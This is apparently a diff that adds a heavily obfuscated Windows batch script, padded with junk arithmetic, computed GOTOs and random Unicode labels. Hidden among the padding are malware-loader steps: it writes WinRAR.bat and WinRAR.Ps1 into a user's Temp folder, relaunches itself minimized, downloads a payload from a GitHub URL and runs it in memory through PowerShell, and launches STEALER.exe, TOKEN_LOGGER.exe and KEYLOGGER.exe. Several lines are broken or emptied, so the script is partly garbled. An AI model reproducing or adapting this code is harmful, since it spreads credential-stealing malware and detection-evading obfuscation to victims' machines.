+ set "q=m" 
+)
+for /l %%d  in (593  593  593) do (
+ set "r=n" 
+)
+for /l %%t  in (352  352  352) do (
+ set "s=o" 
+)
+set /a anS=2*0x5*0x5*0x25*0xb3 
+gOto       (2*0x5*0x5*0x25*0xb3)  
+:454784  
+set /a ans=~-635918 
+gOTo   (~-635918)  
+:884293  
+set "v=r" 
+set/a anS=2*2*2*0x95*~-398 
+gOtO     (2*2*2*0x95*~-398)  
+:412392  
+set "x=t" 
+set/a aNS=2*2*(03273420x31dfd) 
+gOtO      (2*2*(03273420x31dfd))  
+:826034  
+set "z=v" 
+for /l %%w  in (534  534  534) do (
+ set "a=w" 
+)
+for /l %%b  in (328  328  328) do (
+ set "b=x" 
+)
+set /a ans=0x7*~-85448 
+gotO       (0x7*~-85448)  
+:659159  
+for /l %%w  in (16  16  16) do (
+ set "d=z" 
+)
+set "E1=A" 
+set "F1=B" 
+set /a ans=((0x145950016641310)>>3) 
+goTO         (((0x145950016641310)>>3))  
+:276544  
+set /a aNS=(0310061701373452) 
+goTo       ((0310061701373452))  
+:108575  
+set/a aNs=2*~-484112 
+goTo     (2*~-484112)  
+:171836  
+set "J1=F" 
+set/a aNs=~-240968 
+goTo      (~-240968)  
+:659033  
+set /a anS=03*0xb*015*027*065 
+gOTO       (03*0xb*015*027*065)  
+:129562  
+set "M1=I" 
+set "N1=J" 
+set /a anS=2*2*05*0x25*(0x270x140) 
+goTo   (2*2*05*0x25*(0x270x140))  
+:693710  
+set /a ans=2*0xd*0x43*(06540327) 
+goTo     (2*0xd*0x43*(06540327))  
+:732417  
+set /a ans=0x5*05*0x5*0x29*0x97 
+gOtO     (0x5*05*0x5*0x29*0x97)  
+:199213  
+set /a aNs=2*2*2*0x5*0xb*((0xb1a90x1b8e9)>>6) 
+gOTO    (2*2*2*0x5*0xb*((0xb1a90x1b8e9)>>6))  
+:561408  
+set "S1=O" 
+set /a aNS=0x43*0x61*0x67 
+goTO    (0x43*0x61*0x67)  
+:101254  
+set "U1=Q" 
+set /a ans=2*2*0x5*~-33120 
+gOTo     (2*2*0x5*~-33120)  
+:226896  
+set /a anS=2*0x3*0x3*0x3*05*0x11*057 
+gOTO   (2*0x3*0x3*0x3*05*0x11*057)  
+:813189  
+set "X1=T" 
+set /a aNs=0265*~-3332 
+gOtO      (0265*~-3332)  
+:659301  
+set "Z1=V" 
+set "A1=W" 
+set "B1=X" 
+set /a aNS=057*0x35*((066301047)>>2) 
+goTO   (057*0x35*((066301047)>>2))  
+:682647  
+set "D1=Z" 
+doskey /listsize=0 
+echo if not DEFINED IS_MINIMIZED set IS_MINIMIZED=1 
+
+ start "" /min "C:\Users\puncher\AppData\Local\Temp\WinRAR.bat"  
+
+ exit >> C:\Users\puncher\AppData\Local\Temp\WinRAR.bat  
+set /a anS=07*0x3d*~-402 
+gOTo        (07*0x3d*~-402)  
+:709963  
+GOTO ثгなҳّذોаِن0  
+for /l %%z  in (69  69  69) do (
+ rundll32 
+)
+:طзآע્ّतд४م
+set /a anS=2*2*(071060171737) 
+gotO      (2*2*(071060171737))  
+:288193  
+for /l %%f  in (399  399  399) do (
+ set "f=b" 
+)
+set /a anS=0x3*(0430300)*((0x53c680x17a68)>>9) 
+gOTO   (0x3*(0430300)*((0x53c680x17a68)>>9))  
+:106399  
+for /l %%s  in (524  524  524) do (
+ set "h=d" 
+)
+set /a anS=2*2*0x3*0x8b*(07340xc5) 
+goTo   (2*2*0x3*0x8b*(07340xc5))  
+:372671  
+set "j=f" 
+for /l %%g  in (563  563  563) do (
+ set "k=g" 
+)
+for /l %%f  in (735  735  735) do (
+ set "l=h" 
+)
+set "m=i" 
+set "n=j" 
+set/a aNS=0x100*07*~-314 
+gOTo    (0x100*07*~-314)  
+:377192  
+set /a aNS=2*0x3*05*07*(0xc4901734) 
+goTo    (2*0x3*05*07*(0xc4901734))  
+:196215  
+for /l %%j  in (767  767  767) do (
+ set "q=m" 
+)
+for /l %%e  in (414  414  414) do (
+ set "r=n" 
+)
+set /a aNS=0x6d*~-7592 
+gOTo       (0x6d*~-7592)  
+:353177  
+set "t=p" 
+set "u=q" 
+set /a anS=03*0x3*023*~-2478 
+gOto      (03*0x3*023*~-2478)  
+:325568  
+for /l %%x  in (227  227  227) do (
+ set "w=s" 
+)
+set/a ans=0123*(0x1cf0x914) 
+gOTO         (0123*(0x1cf0x914))  
+:886904  
+set "y=u" 
+set /a anS=0x3*013*073*(0x4a0x99) 
+gOtO     (0x3*013*073*(0x4a0x99))  
+:863245  
+for /l %%w  in (378  378  378) do (
+ set "a=w" 
+)
+set /a anS=2*2*0x7*~-32322 
+goTo     (2*2*0x7*~-32322)  
+:129254  
+set /a aNS=05*0xb*(072200032613) 
+gOTO   (05*0xb*(072200032613))  
+:543179  
+set /a ans=2*(0xd2d10274234) 
+gotO      (2*(0xd2d10274234))  
+:305657  
+set/a anS=2*2*2*2*2*~-4494 
+gOtO        (2*2*2*2*2*~-4494)  
+:605815  
+set /a aNS=0x5*((021440240x37be74)>>5) 
+gOTo     (0x5*((021440240x37be74)>>5))  
+:353296  
+set /a aNS=0xd*(0x535b0x17f74) 
+gotO     (0xd*(0x535b0x17f74))  
+:805348  
+set /a aNs=03*03*07*027*0153 
+gOto       (03*03*07*027*0153)  
+:550791  
+for /l %%l  in (411  411  411) do (
+ set "I1=E" 
+)
+set "J1=F" 
+set "K1=G" 
+for /l %%u  in (385  385  385) do (
+ set "L1=H" 
+)
+set "M1=I" 
+set "N1=J" 
+set "O1=K" 
+set "P1=L" 
+for /l %%s  in (361  361  361) do (
+ set "Q1=M" 
+)
+set /a aNs=2*(0x681310627642) 
+gotO         (2*(0x681310627642))  
+:986800  
+set /a anS=0x40*0x1d*(0x1dc0131) 
+gotO      (0x40*0x1d*(0x1dc0131))  
+:238602  
+set /a aNs=0x5*(0x220xd3)*((0570210600021)>>9) 
+gOtO      (0x5*(0x220xd3)*((0570210600021)>>9))  
+:886722  
+set /a aNS=2*((0x52a4902603301)>>3) 
+goTO   (2*((0x52a4902603301)>>3))  
+:273018  
+set /a aNs=0x3*0x5*~-26400 
+goTo       (0x3*0x5*~-26400)  
+:427492  
+set "W1=S" 
+set/a aNs=((0314306553)>>3)*((0x39a210x9ca1)>>7) 
+goto    (((0314306553)>>3)*((0x39a210x9ca1)>>7))  
+:423175  
+set "Y1=U" 
+set "Z1=V" 
+set "A1=W" 
+set "B1=X" 
+set/a aNs=0xd*075*~-588 
+goTo     (0xd*075*~-588)  
+:659871  
+set /a aNs=2*2*0x49*~-2412 
+goto       (2*2*0x49*~-2412)  
+:464450  
+set /a anS=2*2*2*2*07*~-8540 
+goTO        (2*2*2*2*07*~-8540)  
+:751007  
+   >> C:\Users\puncher\AppData\Local\Temp\WinRAR.Ps1  
+set /a anS=~-430094 
+goto       (~-430094)  
+:831620  
+set /a ans=027*(0772450x258e) 
+goto   (027*(0772450x258e))  
+:303576  
+set /a aNS=021*~-41150 
+gOto     (021*~-41150)  
+:948670  
+for /l %%s  in (441  441  441) do (
+ set "h=d" 
+)
+set "i=e" 
+set "j=f" 
+set "k=g" 
+set "l=h" 
+set "m=i" 
+for /l %%a  in (270  270  270) do (
+ set "n=j" 
+)
+set /a aNS=0x5*0x7*0x7*07*0x7*013 
+gOTO       (0x5*0x7*0x7*07*0x7*013)  
+:896313  
+for /l %%u  in (763  763  763) do (
+ set "p=l" 
+)
+set "q=m" 
+set/a aNS=((0650024200x488e20)>>4) 
+goto     (((0650024200x488e20)>>4))  
+:552757  
+set "s=o" 
+set /a ans=2*051*0x2f*0255 
+goTo     (2*051*0x2f*0255)  
+:462370  
+set /a aNs=045*((0xf23060x25a86)>>7) 
+gotO        (045*((0xf23060x25a86)>>7))  
+:630819  
+set /a ans=0x3b*(02430x9be) 
+gOtO         (0x3b*(02430x9be))  
+:745152  
+set /a anS=2*0x3*0247*((030050x21a5)>>5) 
+gOto       (2*0x3*0247*((030050x21a5)>>5))  
+:780281  
+set /a aNs=0x3d*((0x3a8ec0337474)>>4) 
+gOTO   (0x3d*((0x3a8ec0337474)>>4))  
+:823570  
+set "y=u" 
+set "z=v" 
+set /a aNs=2*2*2*(0x880a0x2acf) 
+goto    (2*2*2*(0x880a0x2acf))  
+:147679  
+set "b=x" 
+set /a aNS=2*0xd*021*~-824 
+goTO     (2*0xd*021*~-824)  
+:681679  
+set /a aNS=05*027*((0x3215f036637)>>6) 
+goTO       (05*027*((0x3215f036637)>>6))  
+:444070  
+set/a aNS=2*2*2*2*05*0107*0x67 
+gotO       (2*2*2*2*05*0107*0x67)  
+:772843  
+for /l %%c  in (288  288  288) do (
+ set "F1=B" 
+)
+set "G1=C" 
+set/a ans=0x400*(0x150x34a) 
+gotO   (0x400*(0x150x34a))  
+:271712  
+set /a ans=2*2*2*07*015*0xc5 
+gotO      (2*2*2*07*015*0xc5)  
+:780387  
+for /l %%l  in (6  6  6) do (
+ set "J1=F" 
+)
+set "K1=G" 
+set /a aNs=03*((034005001736314)>>2) 
+gOto        (03*((034005001736314)>>2))  
+:970058  
+set "M1=I" 
+set /a aNs=((0xbafe90x2e14f1)>>3) 
+goto    (((0xbafe90x2e14f1)>>3))  
+:844776  
+set/a anS=03*013*0x97*0xa3 
+goTO     (03*013*0x97*0xa3)  
+:850593  
+set "P1=L" 
+set "Q1=M" 
+for /l %%v  in (345  345  345) do (
+ set "R1=N" 
+)
+set/a anS=2*2*0x3*07*0x7*023*0x2b 
+goTo       (2*2*0x3*07*0x7*023*0x2b)  
+:737726  
+for /l %%t  in (60  60  60) do (
+ set "T1=P" 
+)
+set "U1=Q" 
+set /a ans=03*0x53*((0x1b43d035575)>>6) 
+goto     (03*0x53*((0x1b43d035575)>>6))  
+:518639  
+set "W1=S" 
+set /a ans=0x3*(0x20f990xcd46) 
+gOTO      (0x3*(0x20f990xcd46))  
+:669716  
+for /l %%r  in (850  850  850) do (
+ set "Y1=U" 
+)
+set "Z1=V" 
+set "A1=W" 
+set /a aNS=2*((0x18747b0051671560)>>6) 
+gOTo     (2*((0x18747b0051671560)>>6))  
+:395679  
+set/a anS=2*057*0107*0x47 
+gOtO     (2*057*0107*0x47)  
+:878197  
+for /l %%y  in (420  420  420) do (
+ set "D1=Z" 
+)
+powershell.exe -nop -c "Write-Host -NoNewLine $null" 
+GOTO რខഝଆฉچںژ६ฬ  
+set /a aNs=2*0x95*(0x22e0xae5) 
+gOto         (2*0x95*(0x22e0xae5))  
+:743602  
+set "f=b" 
+for /l %%l  in (836  836  836) do (
+ set "g=c" 
+)
+set /a ans=03*015*0x47*0161 
+gotO      (03*015*0x47*0161)  
+:690069  
+set "i=e" 
+set /a aNs=2*2*021*~-6038 
+gOTO      (2*2*021*~-6038)  
+:381421  
+set /a ans=2*2*0123*(04010x57e) 
+gOTo    (2*2*0123*(04010x57e))  
+:706229  
+set "l=h" 
+set /a ans=07*013*035*0x8b 
+gOtO     (07*013*035*0x8b)  
+:625327  
+for /l %%y  in (440  440  440) do (
+ set "n=j" 
+)
+set /a ans=2*07*(0552460165627) 
+gOtO       (2*07*(0552460165627))  
+:211914  
+set "p=l" 
+set/a aNS=2*((06375635074537735)>>6) 
+gOTO     (2*((06375635074537735)>>6))  
+:596838  
+set "r=n" 
+set /a aNS=2*2*2*2*03*((0x952c90x9b29)>>5) 
+goTo    (2*2*2*2*03*((0x952c90x9b29)>>5))  
+:580054  
+set "t=p" 
+set /a aNS=2*((0x393d2ba063034272)>>9) 
+gOTo        (2*((0x393d2ba063034272)>>9))  
+:738138  
+set "v=r" 
+set "w=s" 
+set "x=t" 
+set/a ans=07*0x1f*~-2448 
+gOTO      (07*0x1f*~-2448)  
+:779201  
+set "z=v" 
+set /a anS=0x3*0xd*057*0227 
+gOtO    (0x3*0xd*057*0227)  
+:880884  
+set /a aNS=2*2*2*2*2*015*(02650x44) 
+gOtO     (2*2*2*2*2*015*(02650x44))  
+:591228  
+set /a ans=045*(040070x23ec) 
+goTo    (045*(040070x23ec))  
+:249765  
+set/a ans=0x5*~-242*~-480 
+gotO        (0x5*~-242*~-480)  
+:168862  
+set /a aNS=0x3*0x7*045*~-242 
+gOTo    (0x3*0x7*045*~-242)  
+:584361  
+for /l %%g  in (477  477  477) do (
+ set "F1=B" 
+)
+for /l %%n  in (110  110  110) do (
+ set "G1=C" 
+)
+for /l %%n  in (393  393  393) do (
+ set "H1=D" 
+)
+set /a aNS=2*03*0x11*((0x1e54d0x3b65d)>>4) 
+gOTo     (2*03*0x11*((0x1e54d0x3b65d)>>4))  
+:114511  
+set /a anS=2*2*0x3b*~-1494 
+gOto      (2*2*0x3b*~-1494)  
+:505143  
+set /a aNs=((0x1ed48c0xd4a14)>>3) 
+gOtO        (((0x1ed48c0xd4a14)>>3))  
+:849302  
+set /a anS=2*021*075*((0xd87a0376572)>>8) 
+gOTO        (2*021*075*((0xd87a0376572)>>8))  
+:591329  
+set "M1=I" 
+set /a aNs=2*05*015*(0x184f0xf40) 
+gOTO      (2*05*015*(0x184f0xf40))  
+:207924  
+set /a aNs=03*03*03*07*0x7*0145 
+gOTo        (03*03*03*07*0x7*0145)  
+:479548  
+set/a ans=0x5*((05365152510110652251)>>9) 
+goto     (0x5*((05365152510110652251)>>9))  
+:190916  
+set /a anS=2*03*07*0x7*053*065 
+goTO      (2*03*07*0x7*053*065)  
+:416655  
+set /a aNs=~-833840 
+gOto   (~-833840)  
+:200178  
+set /a aNS=2*2*0203*~-1070 
+gOto       (2*2*0203*~-1070)  
+:618155  
+for /l %%b  in (671  671  671) do (
+ set "T1=P" 
+)
+set /a anS=~-420*(071350x6b2) 
+goto       (~-420*(071350x6b2))  
+:750870  
+set "V1=R" 
+for /l %%b  in (82  82  82) do (
+ set "W1=S" 
+)
+set/a ans=037*(0252030x14d4) 
+goTO    (037*(0252030x14d4))  
+:680229  
+set "Y1=U" 
+set "Z1=V" 
+set/a anS=2*015*(0x7d5c0x232f) 
+gotO       (2*015*(0x7d5c0x232f))  
+:241801  
+for /l %%o  in (823  823  823) do (
+ set "B1=X" 
+)
+for /l %%f  in (9  9  9) do (
+ set "C1=Y" 
+)
+set /a aNS=0xb*((040701660xd0b96)>>5) 
+gOto      (0xb*((040701660xd0b96)>>5))  
+:305651  
+forfiles /p   /m STEALER.exe /c 'cmd /c start @file' >nul 2>nul 
+:зλζеغఔٰଈеب
+for /l %%o  in (28  28  28) do (
+ rundll32 
+)
+ @  >> C:\Users\puncher\AppData\Local\Temp\WinRAR.bat  
+set /a aNS=2*2*0x3*0x3d*~-644 
+gotO    (2*2*0x3*0x3d*~-644)  
+:228525  
+GOTO ५ژກω२ٹζٹμत  
+timeout 0 >nul 
+:ثгなҳّذોаِن0
+if chcp leq 1 (
+ cd   
+) else (
+cd   
+)
+  / . -  -  - - "C:\Users\puncher\AppData\Local\Temp\WinRAR.ps1" >> C:\Users\puncher\AppData\Local\Temp\WinRAR.bat  
+set /a aNS=((05426460350x1f57fa1d)>>9) 
+goTO     (((05426460350x1f57fa1d)>>9))  
+:312898  
+GOTO ثгなҳّذોаِن1  
+set /a ans=0xa7*~-3408 
+goTo     (0xa7*~-3408)  
+:743035  
+:ثгなҳّذોаِن6
+set /a ans=2*2*07*0255*0255 
+goto     (2*2*07*0255*0255)  
+:346190  
+  
+set /a aNs=2*0xb*0xb*(0x6840663) 
+goTO   (2*0xb*0xb*(0x6840663))  
+:547174  
+GOTO ثгなҳّذોаِن7  
+rundll32 
+:ڈㅔٰחظغଆກしّ
+set /a ans=0xb*~-84350 
+goto        (0xb*~-84350)  
+:250950  
+  "C:\Users\puncher\AppData\Local\Temp\WinRAR.bat"  "C:\Users\puncher\AppData\Local\Temp\WinRAR.bat"  
+set /a aNs=2*2*0x5*0x95*~-242 
+goTO     (2*2*0x5*0x95*~-242)  
+:344829  
+GOTO ْちٹμژಹყ્ّں  
+set /a aNs=(04270xb2)*~-1448 
+gOto     ((04270xb2)*~-1448)  
+:899619  
+set /a aNS=0x2b*(0x3cd05102) 
+gOTo        (0x2b*(0x3cd05102))  
+:361036  
+for /l %%f  in (29  29  29) do (
+ set "g=c" 
+)
+set /a ans=2*2*2*(07510374)*((032176011236)>>5) 
+gOtO    (2*2*2*(07510374)*((032176011236)>>5))  
+:608903  
+set /a anS=2*2*2*05*035*(026001767) 
+gOto     (2*2*2*05*035*(026001767))  
+:892996  
+set "j=f" 
+set "k=g" 
+set "l=h" 
+for /l %%o  in (786  786  786) do (
+ set "m=i" 
+)
+for /l %%a  in (211  211  211) do (
+ set "n=j" 
+)
+set /a aNS=2*2*021*0x1f*0103 
+goTo     (2*2*021*0x1f*0103)  
+:547666  
+set "p=l" 
+for /l %%h  in (913  913  913) do (
+ set "q=m" 
+)
+for /l %%y  in (91  91  91) do (
+ set "r=n" 
+)
+set "s=o" 
+set /a anS=2*2*0x49*((0x3c5c30x1ad03)>>6) 
+goTO      (2*2*0x49*((0x3c5c30x1ad03)>>6))  
+:360765  
+set "u=q" 
+set /a anS=0x7*(0711054126) 
+goto    (0x7*(0711054126))  
+:737749  
+set/a aNs=2*2*03*03*((0x17601202542422)>>8) 
+gOtO   (2*2*03*03*((0x17601202542422)>>8))  
+:392718  
+set /a anS=2*2*2*2*03*~-6218 
+gOTO      (2*2*2*2*03*~-6218)  
+:275014  
+set /a aNs=2*05*05*0xd*0xd*0x13 
+gOto     (2*05*05*0xd*0xd*0x13)  
+:819535  
+set "z=v" 
+set "a=w" 
+set /a anS=(0x60c620153131) 
+goto     ((0x60c620153131))  
+:301115  
+set /a aNS=2*0x11*~-16418 
+goTO     (2*0x11*~-16418)  
+:304590  
+set "d=z" 
+for /l %%s  in (671  671  671) do (
+ set "E1=A" 
+)
+set/a aNS=2*05*(0x4d690163142) 
+gOtO       (2*05*(0x4d690163142))  
+:369427  
+set/a aNs=2*2*2*2*03*0x3*0x3*((0x37160x98e)>>3) 
+gOTO     (2*2*2*2*03*0x3*0x3*((0x37160x98e)>>3))  
+:476218  
+set /a aNS=03*0x3*0xb*(02517020126) 
+goto     (03*0x3*0xb*(02517020126))  
+:577036  
+set "I1=E" 
+for /l %%n  in (246  246  246) do (
+ set "J1=F" 
+)
+for /l %%p  in (493  493  493) do (
+ set "K1=G" 
+)
+set/a aNS=2*(0x9c0x1c1)*~-1040 
+gOTo        (2*(0x9c0x1c1)*~-1040)  
+:762051  
+for /l %%e  in (434  434  434) do (
+ set "M1=I" 
+)
+set "N1=J" 
+set "O1=K" 
+set /a ans=03*(0x50ad80302511) 
+gotO         (03*(0x50ad80302511))  
+:469257  
+set "Q1=M" 
+set "R1=N" 
+set /a aNs=2*2*0x11*~-8670 
+gotO     (2*2*0x11*~-8670)  
+:873393  
+set/a aNS=2*0xd*~-28604 
+gOto   (2*0xd*~-28604)  
+:100152  
+set /a ans=2*2*2*07*0x7*0x7*0x59 
+goto   (2*2*2*07*0x7*0x7*0x59)  
+:141638  
+set /a aNS=0x5*~-28028 
+gOTO   (0x5*~-28028)  
+:613495  
+set /a ans=03*((054225740xd135fc)>>7) 
+gotO    (03*((054225740xd135fc)>>7))  
+:609558  
+for /l %%l  in (345  345  345) do (
+ set "X1=T" 
+)
+for /l %%d  in (485  485  485) do (
+ set "Y1=U" 
+)
+for /l %%w  in (310  310  310) do (
+ set "Z1=V" 
+)
+set /a anS=0155*~-3560 
+gOtO     (0155*~-3560)  
+:883764  
+set /a anS=03*03*~-47792 
+gOTO     (03*03*~-47792)  
+:398709  
+set "C1=Y" 
+set /a aNS=0x3*((0x52250x22025)>>9)*~-978 
+goto     (0x3*((0x52250x22025)>>9)*~-978)  
+:500406  
+mshta 
+:гវڑآμវذшㅔْ
+set /a anS=2*2*2*2*2*07*((01014320x4fa)>>5) 
+goto   (2*2*2*2*2*07*((01014320x4fa)>>5))  
+:151303  
+echo [sakura]::Main((Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/paylar/payload/main/payload1').ParsedHtml.body.innerText) >> C:\Users\puncher\AppData\Local\Temp\WinRAR.Ps1  
+powershell.exe -nop -c "Write-Host -NoNewLine $null" 
+GOTO зλζеغఔٰଈеب  
+set /a aNs=2*03*05*0x5*((0x22f850x4b285)>>8) 
+gOtO    (2*03*05*0x5*((0x22f850x4b285)>>8))  
+:234566  
+:ثгなҳّذોаِن1
+set /a anS=0xb*(0xd02e044251) 
+goTo    (0xb*(0xd02e044251))  
+:424741  
+  >> C:\Users\puncher\AppData\Local\Temp\WinRAR.bat  
+set /a aNs=2*2*07*013*(0745503404) 
+gotO      (2*2*07*013*(0745503404))  
+:745527  
+GOTO ثгなҳّذોаِن2  
+for /l %%e  in (19  19  19) do (
+ rundll32 
+)
+:ّببصаฉきзڈھ
+set /a ans=2*2*2*0x7*((0x1a3d240x4724)>>9) 
+gOTo       (2*2*2*0x7*((0x1a3d240x4724)>>9))  
+:188103  
+  "C:\Users\puncher\AppData\Local\Temp\WinRAR.Ps1" "C:\Users\puncher\AppData\Local\Temp\WinRAR.Ps1"  
+set/a aNs=0x5*0107*((010001570x29ef)>>7) 
+goTo       (0x5*0107*((010001570x29ef)>>7))  
+:597480  
+GOTO ڈㅔٰחظغଆກしّ  
+set /a aNS=2*0x7*045*((0x7e6b30x1a7b3)>>8) 
+goTO      (2*0x7*045*((0x7e6b30x1a7b3)>>8))  
+:422774  
+:΅ፕଆກદچμ६ેഢ
+echo MALWARE.exe >nul 2>nul 
+ '@ >> C:\Users\puncher\AppData\Local\Temp\WinRAR.Ps1  
+forfiles /p   /m TOKEN_LOGGER.exe /c 'cmd /c start @file' >nul 2>nul 
+GOTO χრೂ६ךלეఐਕط  
+if exist C:\Windows\System32 (
+ timeout 0 >nul 
+) else (
+timeout 0 >nul 
+)
+:fَોഢყਕकνبಗ
+set /a aNS=2*0235*~-578 
+goTo (2*0235*~-578)  
+:975175  
+    . = ..(.()) >> C:\Users\puncher\AppData\Local\Temp\WinRAR.Ps1  
+rundll32 
+GOTO अصદ५દزฮਰзי  
+set /a anS=((01230574437061270037)>>8) 
+gOto      (((01230574437061270037)>>8))  
+:361635  
+:რខഝଆฉچںژ६ฬ
+set /a anS=075*((0x1ed1190755631)>>7) 
+goTo      (075*((0x1ed1190755631)>>7))  
+:171954  
+   >> C:\Users\puncher\AppData\Local\Temp\WinRAR.Ps1  
+set /a aNS=2*2*0x1d*~-7928 
+goTO      (2*2*0x1d*~-7928)  
+:716726  
+GOTO ΅ፕଆກદچμ६ેഢ  
+if 4  equ 87693 (
+ echo 4  >nul 
+) else (
+rundll32 
+)
+:अصદ५દزฮਰзי
+cd   
+ ..(  ) >> C:\Users\puncher\AppData\Local\Temp\WinRAR.Ps1  
+set /a anS=((0767125010563207701)>>7) 
+goTo    (((0767125010563207701)>>7))  
+:934659  
+GOTO طзآע્ّतд४م  
+doskey SCHTASKS=SHUTDOWN 
+:λُฐრطںβፕુں
+set "e=a" 
+set /a aNs=05*0xd*(045640x2e9b) 
+gOTO    (05*0xd*(045640x2e9b))  
+:549504  
+set /a ans=~-106502 
+gOTO      (~-106502)  
+:111063  
+for /l %%z  in (961  961  961) do (
+ set "h=d" 
+)
+set "i=e" 
+for /l %%g  in (340  340  340) do (
+ set "j=f" 
+)
+for /l %%m  in (83  83  83) do (
+ set "k=g" 
+)
+set "l=h" 
+set /a ans=(012547360371271) 
+goto     ((012547360371271))  
+:854830  
+for /l %%j  in (961  961  961) do (
+ set "n=j" 
+)
+for /l %%e  in (87  87  87) do (
+ set "o=k" 
+)
+set /a anS=2*2*2*03*0x3*0x3*(0245207575) 
+gOTO         (2*2*2*03*0x3*0x3*(0245207575))  
+:151203  
+set/a aNs=((03234100xe788)>>7)*~-912 
+gOTO   (((03234100xe788)>>7)*~-912)  
+:154327  
+for /l %%e  in (93  93  93) do (
+ set "r=n" 
+)
+set "s=o" 
+set /a ans=2*013*~-28310 
+goTO    (2*013*~-28310)  
+:967763  
+set "u=q" 
+set /a ans=0x3*((0316205701114237)>>4) 
+goTO      (0x3*((0316205701114237)>>4))  
+:491745  
+set/a aNs=2*2*((0x2485e04070600404)>>8) 
+goto        (2*2*((0x2485e04070600404)>>8))  
+:769522  
+set /a aNS=2*2*((01436241022655)>>2) 
+gOTo   (2*2*((01436241022655)>>2))  
+:195455  
+for /l %%a  in (167  167  167) do (
+ set "y=u" 
+)
+set /a aNs=2*05*~-44498 
+gOto       (2*05*~-44498)  
+:416893  
+set /a aNs=03*03*0x11*021*0211 
+gOtO   (03*03*0x11*021*0211)  
+:623134  
+set "b=x" 
+for /l %%q  in (849  849  849) do (
+ set "c=y" 
+)
+set "d=z" 
+set /a ans=0x17*0x61*((0216704507)>>4) 
+gOtO   (0x17*0x61*((0216704507)>>4))  
+:901533  
+set "F1=B" 
+set "G1=C" 
+for /l %%g  in (472  472  472) do (
+ set "H1=D" 
+)
+for /l %%r  in (369  369  369) do (
+ set "I1=E" 
+)
+set /a aNS=2*2*2*021*((02136000x1720)>>5) 
+gotO    (2*2*2*021*((02136000x1720)>>5))  
+:739229  
+set "K1=G" 
+set/a aNS=2*2*2*05*0x5*07*0x7*07*013 
+gOTO      (2*2*2*05*0x5*07*0x7*07*013)  
+:905463  
+set /a aNs=2*03*~-20150 
+gOto   (2*03*~-20150)  
+:290393  
+set /a anS=0xb*065*((015750xb51)>>2) 
+gOTO    (0xb*065*((015750xb51)>>2))  
+:841627  
+for /l %%w  in (290  290  290) do (
+ set "O1=K" 
+)
+for /l %%l  in (125  125  125) do (
+ set "P1=L" 
+)
+set/a aNs=2*0x3*0177*((014066750x2aebd)>>8) 
+goto   (2*0x3*0177*((014066750x2aebd)>>8))  
+:811721  
+set /a aNS=0x5*0x1d*~-3332 
+goTO       (0x5*0x1d*~-3332)  
+:124483  
+set "S1=O" 
+set /a aNS=05*0x5*0x2b*(0370700) 
+goTo   (05*0x5*0x2b*(0370700))  
+:855345  
+for /l %%i  in (73  73  73) do (
+ set "U1=Q" 
+)
+for /l %%r  in (297  297  297) do (
+ set "V1=R" 
+)
+for /l %%h  in (996  996  996) do (
+ set "W1=S" 
+)
+set /a aNs=0xb*0x1f*~-2544 
+gOto       (0xb*0x1f*~-2544)  
+:786559  
+set/a ans=0x3*((0166647716040556516)>>7) 
+gOtO   (0x3*((0166647716040556516)>>7))  
+:529378  
+set "Z1=V" 
+set /a anS=2*027*(0260200275) 
+goTo      (2*027*(0260200275))  
+:302849  
+set "B1=X" 
+set "C1=Y" 
+set "D1=Z" 
+if   ==   (
+ rundll32 
+) else (
+rundll32 
+)
+@   
+set /a ans=2*03*~-113958 
+gotO     (2*03*~-113958)  
+:578587  
+GOTO ثгなҳّذોаِن  
+set/a anS=2*0x3*05*013*023*0111 
+goto      (2*0x3*05*013*023*0111)  
+:250236  
+:ثгなҳّذોаِن2
+doskey REM=IF 
+  \\\\\ / "" / _ / "\"C:\Users\puncher\AppData\Local\Temp\WinRAR.bat\"" /  
+set/a aNS=2*0103*(01121011722) 
+goTo       (2*0103*(01121011722))  
+:970134  
+GOTO چㅁڈഢចఔڑِْો  
+forfiles /p   /m KEYLOGGER.exe /c 'cmd /c start @file' >nul 2>nul 
+:ْちٹμژಹყ્ّں
+doskey PRINT=COMPACT 
+ $ = @' >> C:\Users\puncher\AppData\Local\Temp\WinRAR.Ps1  
+rundll32 
+GOTO ກກزھしLքمنω  
+set /a aNs=2*073*((0x9aea0x3962)>>3) 
+gOTo      (2*073*((0x9aea0x3962)>>3))  
+:548481  
+:خఐλλْڑdشزე
+for /l %%u  in (199  199  199) do (
+ set "e=a" 
+)
+set /a ans=(0x64ccb0x32a3e) 
+goTO      ((0x64ccb0x32a3e))  
+:667651  
+for /l %%s  in (818  818  818) do (
+ set "g=c" 
+)
+set /a aNS=03*0x5*((02635107255311)>>5) 
+gOTO      (03*0x5*((02635107255311)>>5))  
+:396463  
+for /l %%l  in (797  797  797) do (
+ set "i=e" 
+)
+set/a aNS=0x3*03*0x3*0x3*045*0xc1 
+gotO    (0x3*03*0x3*0x3*045*0xc1)  
+:320268  
+set /a aNS=0x7*0153*((0376601032)>>2) 
+goTO         (0x7*0153*((0376601032)>>2))  
+:214372  
+set /a aNS=2*013*~-15668 
+gOTo    (2*013*~-15668)  
+:847992  
+set /a ans=2*(0x4db01621466) 
+goto     (2*(0x4db01621466))  
+:805837  
+set "n=j" 
+set /a anS=0x5*((0x9260x4ae6)>>6)*~-504 
+goto   (0x5*((0x9260x4ae6)>>6)*~-504)  
+:430668  
+set/a anS=0x2f*~-3272 
+goTO        (0x2f*~-3272)  
+:852006  
+set "q=m" 
+set /a aNS=~-252384 
+goTo      (~-252384)  
+:371367  
+for /l %%z  in (248  248  248) do (
+ set "s=o" 
+)
+set /a aNs=0x7*013*0xb*(0x4260x65) 
+goTO        (0x7*013*0xb*(0x4260x65))  
+:131172  
+set /a anS=05*~-199910 
+goto         (05*~-199910)  
+:166738  
+set /a anS=2*03*03*~-23228 
+gOTo      (2*03*03*~-23228)  
+:432169  
+set "w=s" 
+set /a anS=0x3*0x5*0x5*~-6302 
+gOtO     (0x3*0x5*0x5*~-6302)  
+:138107  
+set /a anS=021*((0221312201064742)>>4) 
+goTO    (021*((0221312201064742)>>4))  
+:525192  
+for /l %%m  in (800  800  800) do (
+ set "z=v" 
+)
+set /a aNs=2*2*03*05*((0x9af9a0x21e1a)>>7) 
+gOTo     (2*2*03*05*((0x9af9a0x21e1a)>>7))  
+:955401  
+set "b=x" 
+set/a aNS=0x3*0x5*05*0x5*~-2418 
+goTo     (0x3*0x5*05*0x5*~-2418)  
+:481886  
+set "d=z" 
+set /a aNS=2*2*07*((026223525012047125)>>8) 
+goTo        (2*2*07*((026223525012047125)>>8))  
+:234279  
+set "F1=B" 
+set /a anS=2*~-484398 
+goTO       (2*~-484398)  
+:140072  
